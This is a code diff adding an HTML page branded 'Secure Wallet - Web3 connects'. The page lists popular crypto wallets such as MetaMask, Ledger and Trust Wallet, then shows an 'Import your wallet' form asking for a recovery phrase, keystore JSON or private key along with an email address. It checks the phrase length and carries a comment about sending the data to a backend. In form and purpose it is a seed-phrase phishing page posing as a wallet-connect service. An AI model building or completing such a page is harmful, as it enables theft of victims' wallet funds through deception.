@@ -1,0 +1,289 @@
+<!doctype html>
+<html dir="ltr" lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Wallet - Web3 connects</title>
+    
+    <!-- Tabler Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfonts@2.44.0/tabler-icons.min.css">
+    
+    <!-- Alpine.js -->
+    <script defer src="https://cdn.jsdelivr.net/npm/@alpinejs/collapse@3.13.3/dist/cdn.min.js"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.3/dist/cdn.min.js"></script>
+    
+    <!-- Your CSS -->
+    <link href="assets2/css/index.css" rel="stylesheet">
+
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a1f14 0%, #051209 100%);
+            min-height: 100vh;
+        }
+        .wallet-card {
+            background: rgba(15, 42, 31, 0.6);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        .wallet-card:hover {
+            background: rgba(26, 60, 46, 0.8);
+            border-color: rgba(16, 185, 129, 0.4);
+            transform: translateY(-2px);
+        }
+        .header-nav {
+            background: rgba(10, 31, 20, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(16, 185, 129, 0.1);
+        }
+    </style>
+
+    <!-- Alpine.js Modal Component -->
+    <script>
+    document.addEventListener('alpine:init', () => {
+        Alpine.data('walletPage', () => ({
+            selectedWallet: null,
+            showModal: false,
+            showImportForm: false,
+            walletName: '',
+            email: '',
+            recoveryPhrase: '',
+            importMethod: 'phrase', // 'phrase', 'keystore', 'privatekey'
+            
+            wallets: [
+                { name: 'Exodus', icon: '❌', description: 'A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed. Exodus wallet can go here.' },
+                { name: 'Trust Wallet', icon: '🔷', description: 'Trust Wallet is a secure cryptocurrency wallet supporting multiple blockchains.' },
+                { name: 'Wallet Connect', icon: '🔗', description: 'WalletConnect is an open protocol to connect wallets to dapps.' },
+                { name: 'MetaMask', icon: '🦊', description: 'MetaMask is a crypto wallet & gateway to blockchain apps.' },
+                { name: 'Phantom', icon: '👻', description: 'Phantom is a friendly crypto wallet built for DeFi & NFTs.' },
+                { name: 'Coinbase Wallet', icon: '💼', description: 'Your key to the world of crypto.' },
+                { name: 'Ledger', icon: '🔐', description: 'The most trusted hardware wallet for crypto.' },
+                { name: 'Trezor', icon: '🛡️', description: 'Ultimate protection for your digital assets.' }
+            ],
+
+            openWalletModal(wallet) {
+                this.selectedWallet = wallet;
+                this.showModal = true;
+                document.body.style.overflow = 'hidden';
+            },
+
+            closeModal() {
+                this.showModal = false;
+                this.showImportForm = false;
+                document.body.style.overflow = 'auto';
+                this.resetForm();
+            },
+
+            proceedToImport() {
+                this.showModal = false;
+                this.showImportForm = true;
+            },
+
+            resetForm() {
+                this.walletName = '';
+                this.email = '';
+                this.recoveryPhrase = '';
+                this.importMethod = 'phrase';
+            },
+
+            async submitWallet() {
+                if (!this.walletName || !this.email || !this.recoveryPhrase) {
+                    alert('Please fill all fields');
+                    return;
+                }
+
+                const words = this.recoveryPhrase.trim().split(/\s+/);
+                if (words.length !== 12 && words.length !== 24) {
+                    alert('Recovery phrase must be 12 or 24 words');
+                    return;
+                }
+
+                // Here you would send to your backend
+                console.log({
+                    wallet: this.selectedWallet?.name,
+                    walletName: this.walletName,
+                    email: this.email,
+                    phrase: this.recoveryPhrase,
+                    method: this.importMethod
+                });
+
+                alert('✅ Wallet submitted successfully!');
+                this.closeModal();
+                
+                // Optionally redirect
+                // window.location.href = '/';
+            }
+        }))
+    });
+    </script>
+</head>
+
+<body x-data="walletPage" class="text-white">
+
+    <!-- Header -->
+    <header class="header-nav fixed top-0 left-0 right-0 z-50 py-4">
+        <div class="container flex justify-between items-center">
+            <a href="/" class="text-2xl font-bold">
+                <span style="color: #EFBD31">W</span>
+                <span style="color: #ff4e98">E</span>
+                <span style="color: #44c4ff">B3 CONNECTS</span>
+            </a>
+            <nav class="hidden md:flex gap-8 text-sm">
+                <a href="#" class="hover:text-emerald-400 transition">DApps</a>
+                <a href="#" class="hover:text-emerald-400 transition">NFT</a>
+                <a href="#" class="hover:text-emerald-400 transition">Web3</a>
+            </nav>
+            <button class="px-6 py-2 bg-emerald-500 hover:bg-emerald-600 rounded-lg font-semibold transition">
+                Secure Wallet
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="pt-32 pb-20">
+        <div class="container max-w-5xl">
+            
+            <!-- Title Section -->
+            <div class="mb-12">
+                <h1 class="text-4xl md:text-5xl font-bold mb-4">Secure</h1>
+                <p class="text-gray-400 max-w-3xl">
+                    Refers to the safety and protection of assets, data, and transactions in the crypto space. 
+                    Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.
+                </p>
+            </div>
+
+            <!-- Toggle for showing uninstalled -->
+            <div class="flex justify-between items-center mb-8">
+                <h2 class="text-xl font-semibold">Choose wallet</h2>
+                <label class="flex items-center gap-3 cursor-pointer">
+                    <span class="text-sm text-gray-400">Show uninstalled</span>
+                    <input type="checkbox" class="w-10 h-6 rounded-full appearance-none bg-gray-700 checked:bg-emerald-500 relative cursor-pointer transition">
+                </label>
+            </div>
+
+            <!-- Wallet Grid -->
+            <div class="grid gap-4">
+                <template x-for="wallet in wallets" :key="wallet.name">
+                    <button @click="openWalletModal(wallet)" 
+                            class="wallet-card rounded-2xl p-6 flex items-center gap-4 text-left w-full">
+                        <div class="text-5xl" x-text="wallet.icon"></div>
+                        <div>
+                            <h3 class="text-xl font-semibold" x-text="wallet.name"></h3>
+                        </div>
+                    </button>
+                </template>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Wallet Info Modal -->
+    <template x-teleport="body">
+        <div x-show="showModal" 
+             @click.self="closeModal"
+             class="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm"
+             style="display: none;">
+            
+            <div class="bg-white text-gray-900 rounded-3xl max-w-lg w-full p-8 relative">
+                <button @click="closeModal" class="absolute top-6 right-6 text-3xl text-gray-400 hover:text-gray-600">×</button>
+                
+                <div class="flex items-center gap-4 mb-6">
+                    <div class="text-5xl" x-text="selectedWallet?.icon"></div>
+                    <h2 class="text-2xl font-bold" x-text="selectedWallet?.name"></h2>
+                </div>
+
+                <p class="text-gray-600 mb-8" x-text="selectedWallet?.description"></p>
+
+                <button @click="proceedToImport" 
+                        class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 text-white rounded-xl font-semibold transition">
+                    Connect
+                </button>
+            </div>
+        </div>
+    </template>
+
+    <!-- Import Wallet Form Modal -->
+    <template x-teleport="body">
+        <div x-show="showImportForm" 
+             @click.self="closeModal"
+             class="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm"
+             style="display: none;">
+            
+            <div class="bg-white text-gray-900 rounded-3xl max-w-2xl w-full relative overflow-hidden">
+                <button @click="closeModal" class="absolute top-6 right-6 z-10 text-3xl text-gray-400 hover:text-gray-600">×</button>
+                
+                <!-- Header -->
+                <div class="p-6 border-b flex items-center gap-4">
+                    <div class="text-4xl" x-text="selectedWallet?.icon"></div>
+                    <h2 class="text-2xl font-bold">Import your <span x-text="selectedWallet?.name"></span></h2>
+                </div>
+
+                <!-- Tabs -->
+                <div class="flex border-b">
+                    <button @click="importMethod = 'phrase'" 
+                            :class="importMethod === 'phrase' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500'"
+                            class="flex-1 py-4 font-semibold transition">
+                        Phrase
+                    </button>
+                    <button @click="importMethod = 'keystore'" 
+                            :class="importMethod === 'keystore' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500'"
+                            class="flex-1 py-4 font-semibold transition">
+                        Keystore JSON
+                    </button>
+                    <button @click="importMethod = 'privatekey'" 
+                            :class="importMethod === 'privatekey' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500'"
+                            class="flex-1 py-4 font-semibold transition">
+                        Private Key
+                    </button>
+                </div>
+
+                <!-- Form -->
+                <div class="p-6 space-y-4">
+                    <!-- Name Wallet -->
+                    <div>
+                        <label class="block text-sm font-medium mb-2">Name wallet</label>
+                        <input type="text" 
+                               x-model="walletName"
+                               placeholder="Name wallet" 
+                               class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition">
+                    </div>
+
+                    <!-- Email -->
+                    <div>
+                        <label class="block text-sm font-medium mb-2">Email</label>
+                        <input type="email" 
+                               x-model="email"
+                               placeholder="Email" 
+                               class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition">
+                    </div>
+
+                    <!-- Recovery Phrase / Keystore / Private Key -->
+                    <div>
+                        <label class="block text-sm font-medium mb-2" x-text="importMethod === 'phrase' ? 'Phrase' : importMethod === 'keystore' ? 'Keystore JSON' : 'Private Key'"></label>
+                        <textarea x-model="recoveryPhrase"
+                                  rows="4" 
+                                  :placeholder="importMethod === 'phrase' ? 'Enter your recovery phrase' : importMethod === 'keystore' ? 'Paste keystore JSON' : 'Enter private key'"
+                                  class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition resize-none"></textarea>
+                        <p class="text-xs text-gray-500 mt-2" x-show="importMethod === 'phrase'">
+                            Typically 12 (sometimes 24) words separated by single spaces
+                        </p>
+                    </div>
+
+                    <!-- Buttons -->
+                    <div class="flex gap-4 pt-4">
+                        <button @click="closeModal" 
+                                class="flex-1 py-4 border border-gray-300 rounded-xl font-semibold hover:bg-gray-50 transition">
+                            Cancel
+                        </button>
+                        <button @click="submitWallet" 
+                                class="flex-1 py-4 bg-gradient-to-r from-pink-500 to-emerald-500 text-white rounded-xl font-semibold hover:opacity-90 transition">
+                            Proceed
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </template>
+
+</body>
+</html>
